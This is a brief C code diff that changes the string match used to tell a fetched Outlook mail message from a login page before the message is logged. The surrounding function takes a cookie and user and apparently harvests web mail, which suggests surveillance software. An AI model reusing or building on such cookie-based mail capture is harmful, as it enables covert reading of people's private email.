@@ -101,7 +101,7 @@ DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, 
 		if (response_len > max_social_mail_len)
 			response_len = max_social_mail_len;
 		// Verifica che non mi abbia risposto con la pagina di login
-		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "Received: "))
+		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "Received"))
 			LogSocialMailMessageFull(MAIL_OUTLOOK, r_buffer_inner, response_len, is_incoming, is_draft);
 		else {
 			SAFE_FREE(r_buffer_inner);
